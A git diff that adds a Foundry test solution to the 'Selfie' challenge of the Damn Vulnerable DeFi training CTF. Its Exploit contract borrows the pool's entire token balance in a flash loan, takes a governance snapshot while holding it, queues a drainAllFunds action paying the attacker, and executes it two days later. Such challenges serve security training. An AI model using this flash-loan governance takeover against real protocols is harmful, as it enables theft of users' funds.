@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import "openzeppelin-contracts/access/Ownable.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -45,7 +46,12 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        Exploit exploit = new Exploit(selfiePool, dvtSnapshot);
+        exploit.startHack();
+        vm.warp(block.timestamp + 2 days);
+        exploit.finishHack();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -54,5 +60,44 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Exploit is Ownable {
+    SelfiePool private selfiePool;
+    DamnValuableTokenSnapshot private dvtSnapshot;
+    uint256 private actionId;
+
+    constructor(SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvtSnapshot)
+    {
+        selfiePool = _selfiePool;
+        dvtSnapshot = _dvtSnapshot;
+    }
+
+    function startHack() public onlyOwner {
+        uint256 dvtBalanceSelfiePool = selfiePool.token().balanceOf(
+            address(selfiePool)
+        );
+        selfiePool.flashLoan(dvtBalanceSelfiePool);
+    }
+
+    function finishHack() public onlyOwner {
+        selfiePool.governance().executeAction(actionId);
+    }
+
+    function receiveTokens(address, uint256 _amount) external {
+        // create snapshot on DVTSnapshot
+        dvtSnapshot.snapshot();
+        // queueAction with drainAllFunds to attacker
+        bytes memory data = abi.encodeWithSignature(
+            "drainAllFunds(address)",
+            owner()
+        );
+        actionId = selfiePool.governance().queueAction(
+            address(selfiePool),
+            data,
+            0
+        );
+        dvtSnapshot.transfer(address(selfiePool), _amount);
     }
 }
